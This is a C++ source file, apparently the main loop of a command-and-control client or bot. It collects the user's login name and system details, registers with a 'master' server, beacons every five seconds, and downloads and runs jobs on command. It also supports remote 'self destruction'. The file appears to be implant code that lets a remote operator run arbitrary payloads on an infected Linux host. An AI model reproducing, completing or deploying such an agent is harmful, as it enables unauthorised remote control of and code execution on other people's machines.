
#include "stdafx.h"
#include "ConnectionController.h"
#include "ObjectLoader.h"

ObjectLoader* loader = new ObjectLoader();

void prepareConnection(ConnectionController* cc) {

    // Get username.
    char username[30];
    getlogin_r(username, 30);

    // Get computer information.
    struct utsname buffer;
    if (uname(&buffer) < 0) {
        cc->prepareConnection("UnknownName", username, "Linux ?");
        return;
    }

    // Put all together.
    int infoSize = strlen(buffer.release) + strlen(buffer.machine) + strlen(buffer.version);
    char info[infoSize];
    snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version);

    cc->prepareConnection(buffer.nodename, username, info);
}

void loop(ConnectionController* cc) {

    for (;;) {
        sleep(5);

        int responseCode = cc->ping();
        switch(responseCode) {
            case RESPONSE_EXIT: {
                printf("[%d] Exiting now...\n", responseCode);
                return;
            }

            case RESPONSE_NEW_OBJECT: {
                printf("\nLoading new object...\n");
                
                if (!cc->getNewJob(loader)) {
                    printf("Failed to retrieve new object!\n");
                    continue;
                }

                // Execute job and send status to master.
                int status = loader->run();
                if (cc->finishJob(status) != RESPONSE_LOITER) {
                    printf("Failed to finish job!\n");
                    return;
                }
                break;
            }

            case RESPONSE_NOT_INIT: {
                printf("Server didn't get our credentials, init now...\n");

                int code = cc->initConnection();
                if (code != RESPONSE_LOITER && code != RESPONSE_NEW_OBJECT) {
                    printf("Server responded with invalid code!\n");
                    return;
                }
                
                continue;
            }

            case RESPONSE_DESTROY: {
                printf("[%d] Self destruction commencing...\n", responseCode);
                return;
            }

            case RESPONSE_PONG: {
                printf("PONG \n");
                continue;
            }

            default: {
                printf("An error occured! Code: %d\n", responseCode);
                return;
            }
        }
    }
}

int main(int argc, char* argv[])
{   
    ConnectionController *cc = new ConnectionController();
    prepareConnection(cc);

    int code = cc->initConnection();

    if (code == RESPONSE_NEW_OBJECT) {

        if (!cc->getNewJob(loader)) {
            printf("Failed to retrieve init object!\n");
            return 1;
        }

        // Execute job and send status to master.
        int status = loader->run();
        if (cc->finishJob(status) != RESPONSE_LOITER) {
            printf("Failed to finish job!\n");
            return 1;
        }
    }
    else if (code == RESPONSE_LOITER) {
        // Nothing.
        printf("No init object.\n");
    }
    else if (code == RESPONSE_DESTROY) {
        // Self-destruction.
        printf("Self destruction commencing...\n");
        return 1;
    }
    else if (code == RESPONSE_EXIT) {
        printf("Exiting now...\n");
        return 1;
    }
    else {
        printf("An error occured! Code: %d\n", code);
        return 1;
    }

    loop(cc);
    return 0;
}